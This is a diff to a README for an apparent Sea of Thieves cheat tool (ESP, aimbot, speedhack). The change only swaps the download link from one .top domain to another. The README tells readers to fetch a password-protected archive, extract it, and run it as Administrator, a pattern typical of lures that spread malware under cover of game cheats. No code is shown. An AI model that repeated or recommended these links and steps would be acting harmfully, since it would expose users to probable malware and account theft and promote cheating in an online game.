@@ -6,7 +6,7 @@ Sea of Thieves external hack with ESP, aimbot, speedhack, item ESP, and more. Fo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on reverse engineering and memory editing techniques.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Sea of Thieves.
 4. Run the hack **as Administrator**.
